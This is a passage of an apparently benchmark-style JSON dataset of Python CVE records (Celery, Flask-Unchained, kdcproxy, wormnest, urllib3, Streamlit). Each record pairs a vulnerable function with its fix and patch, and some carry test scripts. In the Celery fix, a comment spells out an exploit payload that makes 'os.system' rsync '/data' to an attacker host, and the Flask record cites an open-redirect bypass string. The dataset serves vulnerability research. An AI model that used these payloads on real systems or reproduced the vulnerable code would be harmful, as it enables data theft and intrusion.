        "file_path": "celery/backends/base.py",
        "start_line": 339,
        "end_line": 369,
        "snippet": "    def exception_to_python(self, exc):\n        \"\"\"Convert serialized exception to Python exception.\"\"\"\n        if exc:\n            if not isinstance(exc, BaseException):\n                exc_module = exc.get('exc_module')\n                if exc_module is None:\n                    cls = create_exception_cls(\n                        from_utf8(exc['exc_type']), __name__)\n                else:\n                    exc_module = from_utf8(exc_module)\n                    exc_type = from_utf8(exc['exc_type'])\n                    try:\n                        # Load module and find exception class in that\n                        cls = sys.modules[exc_module]\n                        # The type can contain qualified name with parent classes\n                        for name in exc_type.split('.'):\n                            cls = getattr(cls, name)\n                    except (KeyError, AttributeError):\n                        cls = create_exception_cls(exc_type,\n                                                   celery.exceptions.__name__)\n                exc_msg = exc['exc_message']\n                try:\n                    if isinstance(exc_msg, (tuple, list)):\n                        exc = cls(*exc_msg)\n                    else:\n                        exc = cls(exc_msg)\n                except Exception as err:  # noqa\n                    exc = Exception(f'{cls}({exc_msg})')\n            if self.serializer in EXCEPTION_ABLE_CODECS:\n                exc = get_pickled_exception(exc)\n        return exc"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_41_1",
        "commit": "1f7ad7e",
        "file_path": "celery/backends/base.py",
        "start_line": 340,
        "end_line": 409,
        "snippet": "    def exception_to_python(self, exc):\n        \"\"\"Convert serialized exception to Python exception.\"\"\"\n        if not exc:\n            return None\n        elif isinstance(exc, BaseException):\n            if self.serializer in EXCEPTION_ABLE_CODECS:\n                exc = get_pickled_exception(exc)\n            return exc\n        elif not isinstance(exc, dict):\n            try:\n                exc = dict(exc)\n            except TypeError as e:\n                raise TypeError(f\"If the stored exception isn't an \"\n                                f\"instance of \"\n                                f\"BaseException, it must be a dictionary.\\n\"\n                                f\"Instead got: {exc}\") from e\n\n        exc_module = exc.get('exc_module')\n        try:\n            exc_type = exc['exc_type']\n        except KeyError as e:\n            raise ValueError(\"Exception information must include\"\n                             \"the exception type\") from e\n        if exc_module is None:\n            cls = create_exception_cls(\n                exc_type, __name__)\n        else:\n            try:\n                # Load module and find exception class in that\n                cls = sys.modules[exc_module]\n                # The type can contain qualified name with parent classes\n                for name in exc_type.split('.'):\n                    cls = getattr(cls, name)\n            except (KeyError, AttributeError):\n                cls = create_exception_cls(exc_type,\n                                           celery.exceptions.__name__)\n        exc_msg = exc.get('exc_message', '')\n\n        # If the recreated exception type isn't indeed an exception,\n        # this is a security issue. Without the condition below, an attacker\n        # could exploit a stored command vulnerability to execute arbitrary\n        # python code such as:\n        # os.system(\"rsync /data attacker@192.168.56.100:~/data\")\n        # The attacker sets the task's result to a failure in the result\n        # backend with the os as the module, the system function as the\n        # exception type and the payload\n        # rsync /data attacker@192.168.56.100:~/data\n        # as the exception arguments like so:\n        # {\n        #   \"exc_module\": \"os\",\n        #   \"exc_type\": \"system\",\n        #   \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n        # }\n        if not isinstance(cls, type) or not issubclass(cls, BaseException):\n            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'\n            raise SecurityError(\n                f\"Expected an exception class, got {fake_exc_type} with payload {exc_msg}\")\n\n        # XXX: Without verifying `cls` is actually an exception class,\n        #      an attacker could execute arbitrary python code.\n        #      cls could be anything, even eval().\n        try:\n            if isinstance(exc_msg, (tuple, list)):\n                exc = cls(*exc_msg)\n            else:\n                exc = cls(exc_msg)\n        except Exception as err:  # noqa\n            exc = Exception(f'{cls}({exc_msg})')\n\n        return exc"
      }
    ],
    "vul_patch": "--- a/celery/backends/base.py\n+++ b/celery/backends/base.py\n@@ -1,31 +1,70 @@\n     def exception_to_python(self, exc):\n         \"\"\"Convert serialized exception to Python exception.\"\"\"\n-        if exc:\n-            if not isinstance(exc, BaseException):\n-                exc_module = exc.get('exc_module')\n-                if exc_module is None:\n-                    cls = create_exception_cls(\n-                        from_utf8(exc['exc_type']), __name__)\n-                else:\n-                    exc_module = from_utf8(exc_module)\n-                    exc_type = from_utf8(exc['exc_type'])\n-                    try:\n-                        # Load module and find exception class in that\n-                        cls = sys.modules[exc_module]\n-                        # The type can contain qualified name with parent classes\n-                        for name in exc_type.split('.'):\n-                            cls = getattr(cls, name)\n-                    except (KeyError, AttributeError):\n-                        cls = create_exception_cls(exc_type,\n-                                                   celery.exceptions.__name__)\n-                exc_msg = exc['exc_message']\n-                try:\n-                    if isinstance(exc_msg, (tuple, list)):\n-                        exc = cls(*exc_msg)\n-                    else:\n-                        exc = cls(exc_msg)\n-                except Exception as err:  # noqa\n-                    exc = Exception(f'{cls}({exc_msg})')\n+        if not exc:\n+            return None\n+        elif isinstance(exc, BaseException):\n             if self.serializer in EXCEPTION_ABLE_CODECS:\n                 exc = get_pickled_exception(exc)\n+            return exc\n+        elif not isinstance(exc, dict):\n+            try:\n+                exc = dict(exc)\n+            except TypeError as e:\n+                raise TypeError(f\"If the stored exception isn't an \"\n+                                f\"instance of \"\n+                                f\"BaseException, it must be a dictionary.\\n\"\n+                                f\"Instead got: {exc}\") from e\n+\n+        exc_module = exc.get('exc_module')\n+        try:\n+            exc_type = exc['exc_type']\n+        except KeyError as e:\n+            raise ValueError(\"Exception information must include\"\n+                             \"the exception type\") from e\n+        if exc_module is None:\n+            cls = create_exception_cls(\n+                exc_type, __name__)\n+        else:\n+            try:\n+                # Load module and find exception class in that\n+                cls = sys.modules[exc_module]\n+                # The type can contain qualified name with parent classes\n+                for name in exc_type.split('.'):\n+                    cls = getattr(cls, name)\n+            except (KeyError, AttributeError):\n+                cls = create_exception_cls(exc_type,\n+                                           celery.exceptions.__name__)\n+        exc_msg = exc.get('exc_message', '')\n+\n+        # If the recreated exception type isn't indeed an exception,\n+        # this is a security issue. Without the condition below, an attacker\n+        # could exploit a stored command vulnerability to execute arbitrary\n+        # python code such as:\n+        # os.system(\"rsync /data attacker@192.168.56.100:~/data\")\n+        # The attacker sets the task's result to a failure in the result\n+        # backend with the os as the module, the system function as the\n+        # exception type and the payload\n+        # rsync /data attacker@192.168.56.100:~/data\n+        # as the exception arguments like so:\n+        # {\n+        #   \"exc_module\": \"os\",\n+        #   \"exc_type\": \"system\",\n+        #   \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n+        # }\n+        if not isinstance(cls, type) or not issubclass(cls, BaseException):\n+            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'\n+            raise SecurityError(\n+                f\"Expected an exception class, got {fake_exc_type} with payload {exc_msg}\")\n+\n+        # XXX: Without verifying `cls` is actually an exception class,\n+        #      an attacker could execute arbitrary python code.\n+        #      cls could be anything, even eval().\n+        try:\n+            if isinstance(exc_msg, (tuple, list)):\n+                exc = cls(*exc_msg)\n+            else:\n+                exc = cls(exc_msg)\n+        except Exception as err:  # noqa\n+            exc = Exception(f'{cls}({exc_msg})')\n+\n         return exc\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-23727:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/celery\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-23727/bin/python -m pytest t/unit/backends/test_base.py::test_BaseBackend_dict::test_not_an_exception_but_a_callable t/unit/backends/test_base.py::test_BaseBackend_dict::test_not_an_exception_but_another_object -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-23727:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/celery\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-23727/bin/python -m pytest t/unit/backends/test_base.py -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2021-23393",
    "cve_description": "This affects the package Flask-Unchained before 0.9.0. When using the the _validate_redirect_url function, it is possible to bypass URL validation and redirect a user to an arbitrary URL by providing multiple back slashes such as \\\\\\evil.com/path. This vulnerability is only exploitable if an alternative WSGI server other than Werkzeug is used, or the default behaviour of Werkzeug is modified using 'autocorrect_location_header=False.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/briancappello/flask-unchained",
    "patch_url": [
      "https://github.com/briancappello/flask-unchained/commit/71e36b28166f9ffbe0a991f51127f0984f7e6a40",
      "https://github.com/briancappello/flask-unchained/commit/2bfeedf1bc31df851cab8c66df0c432b10406aad"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_202_1",
        "commit": "2bfeedf",
        "file_path": "flask_unchained/bundles/controller/utils.py",
        "start_line": 186,
        "end_line": 188,
        "snippet": "def encode_non_url_reserved_characters(url):\n    # safe url reserved characters: https://datatracker.ietf.org/doc/html/rfc3986#section-2.2\n    return urlquote(url, safe=\":/?#[]@!$&'()*+,;=\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_202_1",
        "commit": "71e36b2",
        "file_path": "flask_unchained/bundles/controller/utils.py",
        "start_line": 186,
        "end_line": 188,
        "snippet": "def encode_non_url_reserved_characters(url):\n    # safe url reserved characters: https://datatracker.ietf.org/doc/html/rfc3986#section-2.2\n    return urlquote(url, safe=\":/?#[]@!$&'()*+,;=<>\")"
      }
    ],
    "vul_patch": "--- a/flask_unchained/bundles/controller/utils.py\n+++ b/flask_unchained/bundles/controller/utils.py\n@@ -1,3 +1,3 @@\n def encode_non_url_reserved_characters(url):\n     # safe url reserved characters: https://datatracker.ietf.org/doc/html/rfc3986#section-2.2\n-    return urlquote(url, safe=\":/?#[]@!$&'()*+,;=\")\n+    return urlquote(url, safe=\":/?#[]@!$&'()*+,;=<>\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-5159",
    "cve_description": "python-kdcproxy before 0.3.2 allows remote attackers to cause a denial of service via a large POST request.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/latchset/kdcproxy",
    "patch_url": [
      "https://github.com/latchset/kdcproxy/commit/f274aa6787cb8b3ec1cc12c440a56665b7231882"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_315_1",
        "commit": "e4a7119",
        "file_path": "kdcproxy/__init__.py",
        "start_line": "172",
        "end_line": "276",
        "snippet": "    def __call__(self, env, start_response):\n        try:\n            # Validate the method\n            method = env[\"REQUEST_METHOD\"].upper()\n            if method != \"POST\":\n                raise HTTPException(405, \"Method not allowed (%s).\" % method)\n\n            # Parse the request\n            try:\n                length = int(env[\"CONTENT_LENGTH\"])\n            except AttributeError:\n                length = -1\n            try:\n                pr = codec.decode(env[\"wsgi.input\"].read(length))\n            except codec.ParsingError as e:\n                raise HTTPException(400, e.message)\n\n            # Find the remote proxy\n            servers = self.__resolver.lookup(\n                pr.realm,\n                kpasswd=isinstance(pr, codec.KPASSWDProxyRequest)\n            )\n            if not servers:\n                raise HTTPException(503, \"Can't find remote (%s).\" % pr)\n\n            # Contact the remote server\n            reply = None\n            wsocks = []\n            rsocks = []\n            for server in map(urlparse.urlparse, servers):\n                # Enforce valid, supported URIs\n                scheme = server.scheme.lower().split(\"+\", 1)\n                if scheme[0] not in (\"kerberos\", \"kpasswd\"):\n                    continue\n                if len(scheme) > 1 and scheme[1] not in (\"tcp\", \"udp\"):\n                    continue\n\n                # Do the DNS lookup\n                try:\n                    port = server.port\n                    if port is None:\n                        port = scheme[0]\n                    addrs = socket.getaddrinfo(server.hostname, port)\n                except socket.gaierror:\n                    continue\n\n                # Sort addresses so that we get TCP first.\n                #\n                # Stick a None address on the end so we can get one\n                # more attempt after all servers have been contacted.\n                addrs = tuple(sorted(filter(self.__filter_addr, addrs)))\n                for addr in addrs + (None,):\n                    if addr is not None:\n                        # Bypass unspecified socktypes\n                        if (len(scheme) > 1\n                                and addr[1] != self.SOCKTYPES[scheme[1]]):\n                            continue\n\n                        # Create the socket\n                        sock = socket.socket(*addr[:3])\n                        sock.setblocking(0)\n\n                        # Connect\n                        try:\n                            # In Python 2.x, non-blocking connect() throws\n                            # socket.error() with errno == EINPROGRESS. In\n                            # Python 3.x, it throws io.BlockingIOError().\n                            sock.connect(addr[4])\n                        except socket.error as e:\n                            if e.errno != 115:  # errno != EINPROGRESS\n                                sock.close()\n                                continue\n                        except io.BlockingIOError:\n                            pass\n                        wsocks.append(sock)\n\n                    # Resend packets to UDP servers\n                    for sock in tuple(rsocks):\n                        if self.sock_type(sock) == socket.SOCK_DGRAM:\n                            wsocks.append(sock)\n                            rsocks.remove(sock)\n\n                    # Call select()\n                    timeout = time.time() + (15 if addr is None else 2)\n                    reply = self.__await_reply(pr, rsocks, wsocks, timeout)\n                    if reply is not None:\n                        break\n\n                if reply is not None:\n                    break\n\n            for sock in rsocks + wsocks:\n                sock.close()\n\n            if reply is None:\n                raise HTTPException(503, \"Remote unavailable (%s).\" % pr)\n\n            # Return the result to the client\n            raise HTTPException(200, codec.encode(reply),\n                                [(\"Content-Type\", \"application/kerberos\")])\n        except HTTPException as e:\n            start_response(str(e), e.headers)\n            return [e.message]\n\napplication = Application()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_315_1",
        "commit": "f274aa6",
        "file_path": "kdcproxy/__init__.py",
        "start_line": "173",
        "end_line": "281",
        "snippet": "    def __call__(self, env, start_response):\n        try:\n            # Validate the method\n            method = env[\"REQUEST_METHOD\"].upper()\n            if method != \"POST\":\n                raise HTTPException(405, \"Method not allowed (%s).\" % method)\n\n            # Parse the request\n            try:\n                length = int(env[\"CONTENT_LENGTH\"])\n            except AttributeError:\n                raise HTTPException(411, \"Length required.\")\n            if length < 0:\n                raise HTTPException(411, \"Length required.\")\n            if length > self.MAX_LENGTH:\n                raise HTTPException(413, \"Request entity too large.\")\n            try:\n                pr = codec.decode(env[\"wsgi.input\"].read(length))\n            except codec.ParsingError as e:\n                raise HTTPException(400, e.message)\n\n            # Find the remote proxy\n            servers = self.__resolver.lookup(\n                pr.realm,\n                kpasswd=isinstance(pr, codec.KPASSWDProxyRequest)\n            )\n            if not servers:\n                raise HTTPException(503, \"Can't find remote (%s).\" % pr)\n\n            # Contact the remote server\n            reply = None\n            wsocks = []\n            rsocks = []\n            for server in map(urlparse.urlparse, servers):\n                # Enforce valid, supported URIs\n                scheme = server.scheme.lower().split(\"+\", 1)\n                if scheme[0] not in (\"kerberos\", \"kpasswd\"):\n                    continue\n                if len(scheme) > 1 and scheme[1] not in (\"tcp\", \"udp\"):\n                    continue\n\n                # Do the DNS lookup\n                try:\n                    port = server.port\n                    if port is None:\n                        port = scheme[0]\n                    addrs = socket.getaddrinfo(server.hostname, port)\n                except socket.gaierror:\n                    continue\n\n                # Sort addresses so that we get TCP first.\n                #\n                # Stick a None address on the end so we can get one\n                # more attempt after all servers have been contacted.\n                addrs = tuple(sorted(filter(self.__filter_addr, addrs)))\n                for addr in addrs + (None,):\n                    if addr is not None:\n                        # Bypass unspecified socktypes\n                        if (len(scheme) > 1\n                                and addr[1] != self.SOCKTYPES[scheme[1]]):\n                            continue\n\n                        # Create the socket\n                        sock = socket.socket(*addr[:3])\n                        sock.setblocking(0)\n\n                        # Connect\n                        try:\n                            # In Python 2.x, non-blocking connect() throws\n                            # socket.error() with errno == EINPROGRESS. In\n                            # Python 3.x, it throws io.BlockingIOError().\n                            sock.connect(addr[4])\n                        except socket.error as e:\n                            if e.errno != 115:  # errno != EINPROGRESS\n                                sock.close()\n                                continue\n                        except io.BlockingIOError:\n                            pass\n                        wsocks.append(sock)\n\n                    # Resend packets to UDP servers\n                    for sock in tuple(rsocks):\n                        if self.sock_type(sock) == socket.SOCK_DGRAM:\n                            wsocks.append(sock)\n                            rsocks.remove(sock)\n\n                    # Call select()\n                    timeout = time.time() + (15 if addr is None else 2)\n                    reply = self.__await_reply(pr, rsocks, wsocks, timeout)\n                    if reply is not None:\n                        break\n\n                if reply is not None:\n                    break\n\n            for sock in rsocks + wsocks:\n                sock.close()\n\n            if reply is None:\n                raise HTTPException(503, \"Remote unavailable (%s).\" % pr)\n\n            # Return the result to the client\n            raise HTTPException(200, codec.encode(reply),\n                                [(\"Content-Type\", \"application/kerberos\")])\n        except HTTPException as e:\n            start_response(str(e), e.headers)\n            return [e.message]\n\napplication = Application()"
      },
      {
        "id": "fix_py_315_2",
        "commit": "f274aa6",
        "file_path": "kdcproxy/__init__.py",
        "start_line": "64",
        "end_line": "64",
        "snippet": "    MAX_LENGTH = 128 * 1024"
      }
    ],
    "vul_patch": "--- a/kdcproxy/__init__.py\n+++ b/kdcproxy/__init__.py\n@@ -9,7 +9,11 @@\n             try:\n                 length = int(env[\"CONTENT_LENGTH\"])\n             except AttributeError:\n-                length = -1\n+                raise HTTPException(411, \"Length required.\")\n+            if length < 0:\n+                raise HTTPException(411, \"Length required.\")\n+            if length > self.MAX_LENGTH:\n+                raise HTTPException(413, \"Request entity too large.\")\n             try:\n                 pr = codec.decode(env[\"wsgi.input\"].read(length))\n             except codec.ParsingError as e:\n\n--- /dev/null\n+++ b/kdcproxy/__init__.py\n@@ -0,0 +1 @@\n+    MAX_LENGTH = 128 * 1024\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31502",
    "cve_description": "The operatorequals/wormnest repository through 0.4.7 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/operatorequals/wormnest",
    "patch_url": [
      "https://github.com/operatorequals/wormnest/commit/2dfe96fc2570586ac487b399ac20d41b3c114861"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_264_1",
        "commit": "dd98162",
        "file_path": "app.py",
        "start_line": 113,
        "end_line": 141,
        "snippet": "def dir_listing(req_path):\n  '''\n  Found here:\nhttps://stackoverflow.com/questions/23718236/python-flask-browsing-through-directory-with-files\n  '''\n  # Joining the base and the requested path\n  abs_path = os.path.join(CONFIG['SRV_DIR'], req_path)\n\n  # Return 404 if path doesn't exist\n  if not os.path.exists(abs_path):\n    return abort(404)\n\n  # Check if path is a file and serve\n  if os.path.isfile(abs_path):\n    return send_file(abs_path)\n\n  # Show directory contents\n  files = os.listdir(abs_path)\n  full_paths = []\n  for f in files:\n    full_paths.append(\n      (f, os.path.join(request.base_url, f))\n    )\n  # print (full_paths)\n  add_url_link = \"%s%s/add\" % (request.url_root, CONFIG['MANAGE_URL_DIR'])\n  return render_template('file.html',\n    files=full_paths,\n    add_url=add_url_link\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_264_1",
        "commit": "2dfe96f",
        "file_path": "app.py",
        "start_line": 113,
        "end_line": 141,
        "snippet": "def dir_listing(req_path):\n  '''\n  Found here:\nhttps://stackoverflow.com/questions/23718236/python-flask-browsing-through-directory-with-files\n  '''\n  # Joining the base and the requested path\n  abs_path = safe_join(CONFIG['SRV_DIR'], req_path)\n\n  # Return 404 if path doesn't exist\n  if not os.path.exists(abs_path):\n    return abort(404)\n\n  # Check if path is a file and serve\n  if os.path.isfile(abs_path):\n    return send_file(abs_path)\n\n  # Show directory contents\n  files = os.listdir(abs_path)\n  full_paths = []\n  for f in files:\n    full_paths.append(\n      (f, os.path.join(request.base_url, f))\n    )\n  # print (full_paths)\n  add_url_link = \"%s%s/add\" % (request.url_root, CONFIG['MANAGE_URL_DIR'])\n  return render_template('file.html',\n    files=full_paths,\n    add_url=add_url_link\n    )"
      }
    ],
    "vul_patch": "--- a/app.py\n+++ b/app.py\n@@ -4,7 +4,7 @@\n https://stackoverflow.com/questions/23718236/python-flask-browsing-through-directory-with-files\n   '''\n   # Joining the base and the requested path\n-  abs_path = os.path.join(CONFIG['SRV_DIR'], req_path)\n+  abs_path = safe_join(CONFIG['SRV_DIR'], req_path)\n \n   # Return 404 if path doesn't exist\n   if not os.path.exists(abs_path):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-25091",
    "cve_description": "urllib3 before 1.24.2 does not remove the authorization HTTP header when following a cross-origin redirect (i.e., a redirect that differs in host, port, or scheme). This can allow for credentials in the authorization header to be exposed to unintended hosts or transmitted in cleartext. NOTE: this issue exists because of an incomplete fix for CVE-2018-20060 (which was case-sensitive).",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/urllib3/urllib3",
    "patch_url": [
      "https://github.com/urllib3/urllib3/commit/adb358f8e06865406d1f05e581a16cbea2136fbc"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_391_1",
        "commit": "adb358f8e06865406d1f05e581a16cbea2136fbc",
        "file_path": "src/urllib3/poolmanager.py",
        "start_line": 302,
        "end_line": 359,
        "snippet": "\n    def urlopen(self, method, url, redirect=True, **kw):\n        \"\"\"\n        Same as :meth:`urllib3.connectionpool.HTTPConnectionPool.urlopen`\n        with custom cross-host redirect logic and only sends the request-uri\n        portion of the ``url``.\n\n        The given ``url`` parameter must be absolute, such that an appropriate\n        :class:`urllib3.connectionpool.ConnectionPool` can be chosen for it.\n        \"\"\"\n        u = parse_url(url)\n        conn = self.connection_from_host(u.host, port=u.port, scheme=u.scheme)\n\n        kw['assert_same_host'] = False\n        kw['redirect'] = False\n\n        if 'headers' not in kw:\n            kw['headers'] = self.headers.copy()\n\n        if self.proxy is not None and u.scheme == \"http\":\n            response = conn.urlopen(method, url, **kw)\n        else:\n            response = conn.urlopen(method, u.request_uri, **kw)\n\n        redirect_location = redirect and response.get_redirect_location()\n        if not redirect_location:\n            return response\n\n        # Support relative URLs for redirecting.\n        redirect_location = urljoin(url, redirect_location)\n\n        # RFC 7231, Section 6.4.4\n        if response.status == 303:\n            method = 'GET'\n\n        retries = kw.get('retries')\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect)\n\n        # Strip headers marked as unsafe to forward to the redirected location.\n        # Check remove_headers_on_redirect to avoid a potential network call within\n        # conn.is_same_host() which may use socket.gethostbyname() in the future.\n        if (retries.remove_headers_on_redirect\n                and not conn.is_same_host(redirect_location)):\n            headers = list(six.iterkeys(kw['headers']))\n            for header in headers:\n                if header.lower() in retries.remove_headers_on_redirect:\n                    kw['headers'].pop(header, None)\n\n        try:\n            retries = retries.increment(method, url, response=response, _pool=conn)\n        except MaxRetryError:\n            if retries.raise_on_redirect:\n                raise\n            return response\n\n        kw['retries'] = retries\n        kw['redirect'] = redirect"
      },
      {
        "id": "vul_py_391_2",
        "commit": "a252e2549ff797fe13e688f05296fa496e0c469a",
        "file_path": "src/urllib3/util/retry.py",
        "start_line": 159,
        "end_line": 182,
        "snippet": "    def __init__(self, total=10, connect=None, read=None, redirect=None, status=None,\n                 method_whitelist=DEFAULT_METHOD_WHITELIST, status_forcelist=None,\n                 backoff_factor=0, raise_on_redirect=True, raise_on_status=True,\n                 history=None, respect_retry_after_header=True,\n                 remove_headers_on_redirect=DEFAULT_REDIRECT_HEADERS_BLACKLIST):\n\n        self.total = total\n        self.connect = connect\n        self.read = read\n        self.status = status\n\n        if redirect is False or total is False:\n            redirect = 0\n            raise_on_redirect = False\n\n        self.redirect = redirect\n        self.status_forcelist = status_forcelist or set()\n        self.method_whitelist = method_whitelist\n        self.backoff_factor = backoff_factor\n        self.raise_on_redirect = raise_on_redirect\n        self.raise_on_status = raise_on_status\n        self.history = history or tuple()\n        self.respect_retry_after_header = respect_retry_after_header\n        self.remove_headers_on_redirect = remove_headers_on_redirect"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_391_1",
        "commit": "a252e2549ff797fe13e688f05296fa496e0c469a",
        "file_path": "src/urllib3/poolmanager.py",
        "start_line": 303,
        "end_line": 362,
        "snippet": "        \"\"\"\n        Same as :meth:`urllib3.connectionpool.HTTPConnectionPool.urlopen`\n        with custom cross-host redirect logic and only sends the request-uri\n        portion of the ``url``.\n\n        The given ``url`` parameter must be absolute, such that an appropriate\n        :class:`urllib3.connectionpool.ConnectionPool` can be chosen for it.\n        \"\"\"\n        u = parse_url(url)\n        conn = self.connection_from_host(u.host, port=u.port, scheme=u.scheme)\n\n        kw['assert_same_host'] = False\n        kw['redirect'] = False\n\n        if 'headers' not in kw:\n            kw['headers'] = self.headers.copy()\n\n        if self.proxy is not None and u.scheme == \"http\":\n            response = conn.urlopen(method, url, **kw)\n        else:\n            response = conn.urlopen(method, u.request_uri, **kw)\n\n        redirect_location = redirect and response.get_redirect_location()\n        if not redirect_location:\n            return response\n\n        # Support relative URLs for redirecting.\n        redirect_location = urljoin(url, redirect_location)\n\n        # RFC 7231, Section 6.4.4\n        if response.status == 303:\n            method = 'GET'\n\n        retries = kw.get('retries')\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect)\n\n        # Strip headers marked as unsafe to forward to the redirected location.\n        # Check remove_headers_on_redirect to avoid a potential network call within\n        # conn.is_same_host() which may use socket.gethostbyname() in the future.\n        if (retries.remove_headers_on_redirect\n                and not conn.is_same_host(redirect_location)):\n            for header in retries.remove_headers_on_redirect:\n                kw['headers'].pop(header, None)\n\n        try:\n            retries = retries.increment(method, url, response=response, _pool=conn)\n        except MaxRetryError:\n            if retries.raise_on_redirect:\n                raise\n            return response\n\n        kw['retries'] = retries\n        kw['redirect'] = redirect\n\n        log.info(\"Redirecting %s -> %s\", url, redirect_location)\n        return self.urlopen(method, redirect_location, **kw)\n\n\nclass ProxyManager(PoolManager):"
      },
      {
        "id": "fix_py_391_2",
        "commit": "adb358f8e06865406d1f05e581a16cbea2136fbc",
        "file_path": "src/urllib3/util/retry.py",
        "start_line": 159,
        "end_line": 183,
        "snippet": "    def __init__(self, total=10, connect=None, read=None, redirect=None, status=None,\n                 method_whitelist=DEFAULT_METHOD_WHITELIST, status_forcelist=None,\n                 backoff_factor=0, raise_on_redirect=True, raise_on_status=True,\n                 history=None, respect_retry_after_header=True,\n                 remove_headers_on_redirect=DEFAULT_REDIRECT_HEADERS_BLACKLIST):\n\n        self.total = total\n        self.connect = connect\n        self.read = read\n        self.status = status\n\n        if redirect is False or total is False:\n            redirect = 0\n            raise_on_redirect = False\n\n        self.redirect = redirect\n        self.status_forcelist = status_forcelist or set()\n        self.method_whitelist = method_whitelist\n        self.backoff_factor = backoff_factor\n        self.raise_on_redirect = raise_on_redirect\n        self.raise_on_status = raise_on_status\n        self.history = history or tuple()\n        self.respect_retry_after_header = respect_retry_after_header\n        self.remove_headers_on_redirect = frozenset([\n            h.lower() for h in remove_headers_on_redirect])"
      }
    ],
    "vul_patch": "--- a/src/urllib3/poolmanager.py\n+++ b/src/urllib3/poolmanager.py\n@@ -1,5 +1,3 @@\n-\n-    def urlopen(self, method, url, redirect=True, **kw):\n         \"\"\"\n         Same as :meth:`urllib3.connectionpool.HTTPConnectionPool.urlopen`\n         with custom cross-host redirect logic and only sends the request-uri\n@@ -42,10 +40,8 @@\n         # conn.is_same_host() which may use socket.gethostbyname() in the future.\n         if (retries.remove_headers_on_redirect\n                 and not conn.is_same_host(redirect_location)):\n-            headers = list(six.iterkeys(kw['headers']))\n-            for header in headers:\n-                if header.lower() in retries.remove_headers_on_redirect:\n-                    kw['headers'].pop(header, None)\n+            for header in retries.remove_headers_on_redirect:\n+                kw['headers'].pop(header, None)\n \n         try:\n             retries = retries.increment(method, url, response=response, _pool=conn)\n@@ -56,3 +52,9 @@\n \n         kw['retries'] = retries\n         kw['redirect'] = redirect\n+\n+        log.info(\"Redirecting %s -> %s\", url, redirect_location)\n+        return self.urlopen(method, redirect_location, **kw)\n+\n+\n+class ProxyManager(PoolManager):\n\n--- a/src/urllib3/util/retry.py\n+++ b/src/urllib3/util/retry.py\n@@ -21,4 +21,5 @@\n         self.raise_on_status = raise_on_status\n         self.history = history or tuple()\n         self.respect_retry_after_header = respect_retry_after_header\n-        self.remove_headers_on_redirect = remove_headers_on_redirect\n+        self.remove_headers_on_redirect = frozenset([\n+            h.lower() for h in remove_headers_on_redirect])\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-35918",
    "cve_description": "Streamlit is a data oriented application development framework for python. Users hosting Streamlit app(s) that use custom components are vulnerable to a directory traversal attack that could leak data from their web server file-system such as: server logs, world readable files, and potentially other sensitive information. An attacker can craft a malicious URL with file paths and the streamlit server would process that URL and return the contents of that file. This issue has been resolved in version 1.11.1. Users are advised to upgrade. There are no known workarounds for this issue.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/streamlit/streamlit",
    "patch_url": [
      "https://github.com/streamlit/streamlit/commit/80d9979d5f4a00217743d607078a1d867fad8acf"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_380_1",
        "commit": "4a04eefe248b9af28ba5b563e54d665f68e49116",
